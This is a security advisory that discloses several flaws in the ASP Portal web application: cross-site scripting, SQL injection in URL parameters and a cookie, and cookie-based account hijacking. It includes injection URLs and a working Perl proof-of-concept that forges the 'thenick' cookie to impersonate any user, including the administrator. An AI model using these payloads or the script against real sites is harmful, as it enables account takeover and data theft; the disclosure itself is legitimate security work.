Title: Asp Portal Multiple Vulnerabilities 

By: Manuel López 

Software: Asp Portal 

Vendor Description:
ASP Portal is a an ASP powered portal site which uses an Access database to 
store all the site info. The script also includes and easy to use Admin 
Interface, so you can change everything you need to online, which makes 
maintaing the site very easy. 

Severity:
Moderately critical 

Impact:
Disclosure of authentication information, Disclosure of user information, 
Execution of arbitrary code via network, Modification of user information, 
ID Spoofing. 

Underlying OS:  Linux (Any), UNIX (Any), Windows (Any) 

Description: 

 ---- Cross-Site Scripting ---- 

This product is vulnerable to the Cross-Site Scripting vulnerability that 
would allow attackers to inject HTML and script codes into the pages and 
execute it on the client's browser. 

http://localhost/index.asp?inc='>[XSS]
http://localhost/index.asp?inc=profile&searchtext='>[XSS]
http://localhost/index.asp?inc=forumread&article='>[XSS] 

 ---- Image ScriptCode Injection ---- 

An attacker can inject arbitrary HTML or scriptcode instead of an Image in 
"photograph URL" of user's 'details' page.
javascript:alert() 

 ---- Sql Injection ---- 

Another problem of sanitation could lead an attacker to inject SQL code to 
manipulate and disclose various information from the database. The problem 
is in the fields 'pageid' and 'downloadscat'. 

http://localhost/index.asp?inc=blog&pageid='[SqlQuery]
http://localhost/index.asp?inc=downloadssub&downloadscat='[SqlQuery] 

Also it is possible an Sql Injection in the cookie, in 'thenick' field. 

GET http://localhost/index.asp HTTP/1.1
Cookie: thenick='[SqlQuery] 

 ---- Cookie Account Hijack ---- 

It is possible to impersonate others by manipulating the 'thenick' parameter 
in the cookie.
Modifying the cookie is possible to gain access to other account. This issue 
can be exploited to gain an administrative account with the service. 

 ---- PROOF OF CONCEPT COOKIE ACCOUNT HIJACK ---- 

#!/usr/bin/perl -w
## PROOF OF CONCEPT COOKIE ACCOUNT HIJACK
## Example: Asp-POC.pl localhost portal/index.asp Admin respuesta.htm 

use IO::Socket;
if (@ARGV < 4)
{
print "\n\n";
print " ____________________________________________________________ \n";
print "|                                                            |\n";
print "|   PROOF OF CONCEPT COOKIE ACCOUNT HIJACK                   |\n";
print "|   Usage:Asp-POC.pl [host] [directorio] [usuario] [fichero] |\n";
print "|                                                            |\n";
print "|   By: Manuel López #IST                                    |\n";
print "|____________________________________________________________|\n";
print "\n\n";
exit(1);
} 

$host = $ARGV[0];
$directorio = $ARGV[1];
$usuario = $ARGV[2];
$fichero = $ARGV[3]; 

print "\n";
print "----- Conectando <----\n";
$socket = IO::Socket::INET->new(Proto => "tcp",
PeerAddr => "$host",PeerPort => "80") || die "$socket error $!";
print "====> Conectado\n";
print "====> Enviando Datos\n";
$socket->print(<<taqui) or die "write: $!";
GET http://$host/$directorio HTTP/1.1
Cookie: thenick=$usuario 

taqui
print "====> OK\n";
print "====> Generando $fichero ...\n";
open( Result, ">$fichero");
print Result while <$socket>;
close Result;
